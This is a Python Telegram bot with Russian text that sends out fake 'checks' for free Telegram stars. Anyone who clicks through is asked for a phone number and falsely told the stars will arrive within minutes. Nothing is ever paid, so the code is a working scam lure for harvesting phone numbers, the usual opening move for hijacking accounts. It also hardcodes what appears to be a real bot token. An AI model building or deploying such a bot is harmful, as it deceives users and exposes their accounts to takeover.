from flask import Flask
import telebot
from telebot.types import InlineQueryResultArticle, InputTextMessageContent, InlineKeyboardMarkup, InlineKeyboardButton
import threading
import re

BOT_TOKEN = "8959279502:AAGJIX6qqoSwgFa-Y0lXnhC4ClIR9nE4ifI"

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# URL твоего бота
BOT_URL = "https://t.me/StarCheclBot"

@app.route('/')
def index():
    return "✅ Бот работает!"

# ---------- INLINE-РЕЖИМ (меню с суммами) ----------
@bot.inline_handler(lambda query: True)
def inline_handler(inline_query):
    results = []
    amounts = [100, 200, 300, 500, 700, 1000]
    for amt in amounts:
        keyboard = InlineKeyboardMarkup()
        keyboard.add(
            InlineKeyboardButton(
                f"🤖 Забрать {amt} звёзд в боте",
                url=BOT_URL
            )
        )
        
        results.append(
            InlineQueryResultArticle(
                id=str(amt),
                title=f"⭐ Чек на {amt} звёзд",
                description=f"Нажми, чтобы забрать {amt} звёзд",
                input_message_content=InputTextMessageContent(
                    f"🎯 **Ты получил чек на {amt} звёзд!**\nНажми на кнопку ниже, чтобы забрать их.",
                    parse_mode='Markdown'
                ),
                reply_markup=keyboard
            )
        )
    bot.answer_inline_query(inline_query.id, results)

# ---------- КОМАНДА /start ----------
@bot.message_handler(commands=['start'])
def start_cmd(message):
    bot.send_message(
        message.chat.id,
        "🌟 **Привет!**\n"
        "Я бот для получения чеков на звёзды.\n\n"
        "📱 **Введи номер телефона** (например, +71234567890),\n"
        "чтобы получить звёзды:",
        parse_mode='Markdown'
    )

# ---------- ОБРАБОТКА НОМЕРА ТЕЛЕФОНА ----------
@bot.message_handler(func=lambda message: True)
def handle_text(message):
    phone = message.text.strip()
    
    # Проверяем, что номер начинается с + и содержит только цифры и +
    if phone.startswith('+') and re.match(r'^\+\d{10,15}$', phone):
        bot.reply_to(
            message,
            f"✅ **Номер {phone} принят!**\n"
            f"Звёзды будут начислены в течение 2-5 минут.",
            parse_mode='Markdown'
        )
        # Здесь будет логика с подарками
    else:
        bot.reply_to(
            message,
            "❌ **Неверный формат номера!**\n"
            "Введи номер в международном формате.\n"
            "Например: +71234567890",
            parse_mode='Markdown'
        )

# ---------- ЗАПУСК БОТА ----------
def run_bot():
    bot.polling(none_stop=True)

threading.Thread(target=run_bot, daemon=True).start()

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
